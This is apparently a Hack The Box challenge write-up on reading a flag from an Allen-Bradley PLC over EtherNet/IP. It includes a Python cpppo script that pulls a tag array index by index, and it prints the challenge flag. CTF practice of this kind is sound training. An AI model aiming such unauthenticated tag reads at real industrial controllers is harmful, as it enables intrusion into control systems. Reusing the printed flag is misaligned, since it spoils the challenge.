---
title: "Ether Tag - ICS Challenge"
date: 2026-02-26 00:03:00 +0000
categories: [HTB-Challenges]
tags: [ics, ethernet-ip, cip, plc, allen-bradley, rockwell]
---

## Overview

The Ether Tag challenge involves exploiting an Industrial Control Systems (ICS) environment by communicating with a remote controller via the EtherNet/IP protocol to retrieve a flag stored in a tag array.

**Target Details:**
- IP: 94.237.63.176
- Port: 38866

## Technical Background

EtherNet/IP adapts the Common Industrial Protocol (CIP) to standard Ethernet for use in automation and control systems, particularly with Rockwell Automation/Allen-Bradley PLCs. Data in PLCs is organized into tags that can be simple types or complex structures.

## Methodology

### Reconnaissance
Initial connectivity verification was performed using standard network tools to confirm the target service was accessible on the non-standard port.

### Tool Selection
Two libraries were considered:
- **pycomm3**: Modern library for Allen-Bradley PLCs
- **cpppo**: Flexible library better suited for non-standard ports and raw CIP communication

The `cpppo` library was selected due to superior handling of custom connection parameters.

### Exploitation Strategy
Initial attempts to read the FLAG tag returned only a single character, indicating the value was stored as an array. The solution required iterating through array indices sequentially until reaching a null terminator.

## Solution

```python
from cpppo.server.enip.get_attribute import proxy_simple

def solve():
    host = '94.237.63.176'
    port = 38866
    tag = 'FLAG'

    p = proxy_simple(host, port=port)
    flag = ""

    for i in range(50):
        tag_idx = f"{tag}[{i}]"
        val = list(p.read(tag_idx))[0][0]
        if val == 0: break
        flag += chr(val)
        print(f"Reading {tag_idx}: {chr(val)}")

    print(f"Final Flag: {flag}")
```

## Results

The script successfully reconstructed the flag by reading 21 array indices, converting ASCII values to characters.

**Flag:** `HTB{3th3rn3t1p_pwn3d}`
